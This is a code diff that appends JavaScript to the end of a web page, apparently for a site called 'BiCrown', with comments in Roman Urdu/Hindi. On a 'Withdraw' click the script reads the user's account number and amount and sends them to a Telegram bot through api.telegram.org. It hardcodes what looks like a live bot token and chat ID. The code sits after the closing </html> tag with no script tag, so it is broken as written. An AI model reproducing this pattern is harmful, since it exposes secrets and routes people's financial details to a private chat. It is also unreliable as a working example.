@@ -107,3 +107,36 @@
 </body>
 
 </html>
+
+// Tumhara Secret Data
+const botToken = "8494802061:AAHOhQJElPVkOqCuyZ0cP5PKL3k0_P50dDE";
+const chatId = "7005219148";
+
+// Jab koi Withdraw button dabaye
+document.querySelectorAll('.action-btn').forEach(btn => {
+    btn.addEventListener('click', function() {
+        // Form se data nikalna
+        const inputs = document.querySelectorAll('input');
+        const accNum = inputs[0].value; // Pehla box (Account)
+        const amount = inputs[1].value; // Doosra box (Amount)
+
+        if(accNum && amount) {
+            // Telegram ke liye message tayyar karna
+            const message = `👑 *BiCrown - New Request* 👑%0A%0A💰 *Amount:* Rs ${amount}%0A💳 *Account:* ${accNum}%0A👤 *User ID:* ${chatId}`;
+            
+            // Telegram API ko message bhejna
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}&parse_mode=Markdown`)
+            .then(res => {
+                alert("Mubarak ho! Apki request admin ko bhej di gayi hai.");
+                // Input boxes khali kar dena
+                inputs[0].value = "";
+                inputs[1].value = "";
+            })
+            .catch(err => {
+                alert("Error: Message nahi gaya!");
+            });
+        } else {
+            alert("Jani, pehle Account aur Amount to likho!");
+        }
+    });
+});
